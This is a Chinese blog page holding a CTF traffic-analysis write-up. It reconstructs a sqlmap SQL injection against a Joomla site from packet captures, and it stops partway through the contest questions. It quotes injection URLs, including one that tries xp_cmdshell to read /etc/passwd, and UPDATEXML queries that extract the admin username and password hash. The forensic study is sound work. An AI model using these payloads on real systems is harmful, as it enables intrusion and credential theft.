@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="xiaomeiqiu">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="xiaomeiqiu">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2018西普杯铁人三项河南赛区（数据分析赛） · xiaomeiqiu&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">xiaomeiqiu&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018西普杯铁人三项河南赛区（数据分析赛）</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">xiaomeiqiu's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018西普杯铁人三项河南赛区（数据分析赛）
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="流量分析">流量分析</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/06/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title=".前言"></a>.前言</h2><p>首先说下踩坑经历。第一次参加这种综合性比赛、数据赛、个人赛（主要是pwn）、企业赛，看到pwn没办法我们只能对他说再见（从头到尾连看都没看）。最让我开心的事就是打企业赛时我装了傻逼wps，真‘开心哈’。看似是一道文件上传题，n种姿势上传都失败，查看上传的文件发现什~$msf.doc、~$office.doc、……<a id="more"></a>，然后就是我们自己乱上传的那些东西。当时有点蒙圈，这些东西我都没上传呀，哪来的？？不会是被人干掉了吧。然而最后才知道每个人的环境都是独立的，而且这个题目考的就是我以前演示过的CEV2017-11882，赛后交流大佬们说，当时下载msf.doc，一打开屏幕弹出来个计算机，这个就再明显不过了！！！，然而我完美的避过了这些信息，我也下载msf.doc但是没弹计算器，只因为我下载了wps，对流氓wps！！！！。一脑子就在想文件上传，传了n次。 后来那台服务器上还运行另一个服务，打开看看是joomal，流量分析里面也是joomal，如果好好做流量分析。差不多可以做出来大部分了。比赛做的还是很良心的。起码给writeup。最后全靠运气跑到第六。还是见的少应该多看看大佬们怎样玩渗透。接下来我们复现下数据分析赛的答案，流量分析玩着感觉不错也学到了好多东西。分享记录下。有空我会接着做其他赛区的流量分析题的。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title=".题目描述"></a>.题目描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line"></span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line"></span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line"></span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line"></span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line"></span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line"></span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line"></span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line"></span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line"></span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line"></span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line"></span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line"></span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure>
+<h3 id="第一个数据包分析："><a href="#第一个数据包分析：" class="headerlink" title="第一个数据包分析："></a>第一个数据包分析：</h3><p>应该是网站被种马然后接着往内网渗透。先过滤一波http请求，先总体看一下http的请求发现大量可疑数据（大量404的出现，以及大量的get请求，并且包含sql语句猜测是扫描器进行测试）发现是sqlmap进行注入如下图。显示过滤器输入http<img src="http://23.105.208.131/wp-content/uploads/2018/06/问题一.png" alt> 那基本上可以确定进行被攻击的内网ip为192.168.1.8，攻击者的ip是202.1.1.2。我们接着看黑客进行了什么操作。我们过滤掉不是192.168.1.8请求和响应的。显示过滤器中输入：http &amp;&amp; ip.addr == 192.168.1.8 发现对好几个参数进行测试sql注入，我们只列举出来部分参数。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.1.1.1:8000/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(&amp;XfqR=2916 AND 1=1 UNION ALL SELECT 1,NULL,&apos;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&apos;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&apos;cat ../../../etc/passwd&apos;)#</span><br></pre></td></tr></table></figure></p>
+<p>分析第一条请求的相应数据包，其响应头服务器500报错了，但是仔细看到FROM <code>ajtuc\_ucm\_history\</code> 爆出数据表的名字了，也就是<code>list\[select\]</code>这个参数是可以注入的而且是第一个可用参数，但是看到中间突然又去测试其他参数了。并没有利用。所以利用的不一定是他。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://202.1.1.1:8000/index.php?/option=com_contenthistory,,()&quot;)```  </span><br><span class="line"></span><br><span class="line">分析第二条请求头以及响应数据包，在option参数进行测试注入，但是响应数据包返回404，可以判断这个地方不存在sql注入。</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://202.1.1.1:8000/index.php?/option=com_contenthistory&amp;view=history&#39;" target="_blank" rel="noopener">http://202.1.1.1:8000/index.php?/option=com_contenthistory&amp;view=history&#39;</a> AND (SELECT 2<em>(IF((SELECT </em> FROM (SELECT CONCAT(0x71626a6b71,(SELECT (ELT(2139=2139,1))),0x716a717671,0x78))s), 8446744073709551610, 8446744073709551610)))– RSkb&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(*<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">分析第三条请求头以及响应数据包，在view参数进行测试注入，但是响应数据包返回500，但是追踪流并没发现注入有用的相关信息，但是不排除可以注入，我们追踪他的最后一条这样的请求头（如果最后一条请求头带数据库数据表相关信息说明此参数可以注入），最后参数请求头的最后一条还是没有信息。所以判断hack不在这进行注入</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://202.1.1.1:8000/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&quot;" target="_blank" rel="noopener">http://202.1.1.1:8000/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&quot;</a>) OR (SELECT 2<em>(IF((SELECT </em> FROM (SELECT CONCAT(0x71626a6b71,(SELECT (ELT(5101=5101,1))),0x716a717671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (“hqBE”=”hqBE&amp;item_id=1&amp;type_id=1&amp;list[select]=(*<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析第四条请求头以及响应数据包，在list\[ordering\]参数进行测试注入，服务器响应500，仔细观察响应头，还是发现有用信息的爆出了表名数据库名字，我们看看hack有没有利用这里进行注入，还是追踪这个参数的最后一个请求，依然没有相关数据库表相关信息，所以也不是利用这个参数进行注入。 虽然还有其他参数的注入测试这里就不再一一分析了，其他的请求分析参照前面四条请求头分析。 一般的逻辑应该是注入出来自己想要的信息就停手了，所以我们直接看最后一条类似注入的请求就可以看出来注入参数在哪。以及数据库数据表的相关信息，最后的请求信息为：很明显这里显示出数据库的名字joomal，表前缀ajtuc也有了。</span><br></pre></td></tr></table></figure></p>
+<p>/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查users表应该查出来账号和密码了,接着就该登录后台了。登录肯定是post请求，然后我们再过滤下 http.request.method== POST &amp;&amp; ip.dst == 192.168.1.8，三条请求![](http://23.105.208.131/wp-content/uploads/2018/06/问题四.png) 我们分别来看下干了什么操作，第一个包应该是注册的时候用的，有邮箱，注册信息啥的，感觉没啥用。 ![](http://23.105.208.131/wp-content/uploads/2018/06/1.png) 第二个包登录了看起来是账号和密码，但是比赛的时候提交不对好像。 ![](http://23.105.208.131/wp-content/uploads/2018/06/3.png) 第三个包还是账号密码，然而比赛这些我都找到了还是不对。emememem...想打人 ![](http://23.105.208.131/wp-content/uploads/2018/06/2.png) 最后那我发现这位大兄弟好像没有登录后台，因为post只有三个包，都没登录上去。但是最后突然连接一个kkkkaaaa.php的木马是什么意思？？。你早有马，非要强行加入sqlmap一波流量对吧。</span><br></pre></td></tr></table></figure></p>
+<p>这个时候我们来从头到尾分析一下：</p>
+<p>首先hack ip：202.1.1.2</p>
+<p>被攻击的主机：192.168.1.8</p>
+<p>攻击方式:sqlmap多个参数进行暴力测试sql注入</p>
+<p>sql注入用的参数为：list[select]</p>
+<p>被攻击主机上数据库为：joomal</p>
+<p>被攻击主机上的表前缀为：_ajtuc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来我们分析joomal的后台的账号密码：由最后一条注入数据包的相应数据包我们可以分析出来后台管理账号为amdin</span><br></pre></td></tr></table></figure></p>
+<p>_Error: 500 XPATH syntax error: ‘qqzvqadminqqkkq’ SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71_<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们查找对password的注入。在显示过滤器中输入ip.dst == 192.168.1.8 &amp;&amp; http.request.uri contains &quot;password&quot; 得到三条数据包，我们分别追踪他们的相应数据包，得到三条数据</span><br></pre></td></tr></table></figure></p>
+<p>1.请求sql语句<br>SELECT (UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7096)),uc.name AS editor FROM <code>ajtuc_ucm_history</code> AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE <code>h</code>.<code>ucm_item_id</code> = 1 AND <code>h</code>.<code>ucm_type_id</code> = 1 ORDER BY <code>h</code>.<code>save_date</code><br>响应主要数据：qqzvq$2y$10$lXujU7XaUviJDigqqkkq<br>2.请求sql语句<br>SELECT (UPDATEXML(3613,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),23,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7939)),uc.name AS editor FROM <code>ajtuc_ucm_history</code> AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE <code>h</code>.<code>ucm_item_id</code> = 1 AND <code>h</code>.<code>ucm_type_id</code> = 1 ORDER BY <code>h</code>.<code>save_date</code><br>响应主要数据：qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq<br>3.请求sql语句<br>SELECT (UPDATEXML(8949,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),45,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),3079)),uc.name AS editor FROM <code>ajtuc_ucm_history</code> AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE <code>h</code>.<code>ucm_item_id</code> = 1 AND <code>h</code>.<code>ucm_type_id</code> = 1 ORDER BY <code>h</code>.<code>save_date</code><br>响应主要数据：qqzvqzi/8B2QRD7qIlDJeqqkkq<br><code>`</code></p>
+<p>然后把concat里面多余数据去掉<code>--qqzvp、qqkkq</code>，得到最终hash值为：<code>$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe</code> 然后我不会解了，emem看了好几个表哥也没有解出来，我也在坐等解法。接下来等我下次有空再写！！！！</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="23.105.208.131">xiaomeiqiu</a>
+            </p><p>原文链接：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/</a>
+            </p><p>发表日期：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">六月 10日 2018, 11:04:44 晚上</a>
+            </p><p>更新日期：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">February 27th 2019, 5:43:04 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/01/18/python-flaslk-web/" title="Python-Flask-小项目">
+                    <div class="nextTitle">Python-Flask-小项目</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1870977163@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/xiaomeiqiu007" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">2.</span> <span class="toc-text">.题目描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一个数据包分析："><span class="toc-number">2.1.</span> <span class="toc-text">第一个数据包分析：</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 3
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/XXE攻击/">XXE攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href="/2019/01/18/python-flaslk-web/">Python-Flask-小项目</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href="/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">2018西普杯铁人三项河南赛区（数据分析赛）</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="FLASK"><span class="iconfont-archer">&#xe606;</span>FLASK</span>
+    
+        <span class="sidebar-tag-name" data-tags="WEB"><span class="iconfont-archer">&#xe606;</span>WEB</span>
+    
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
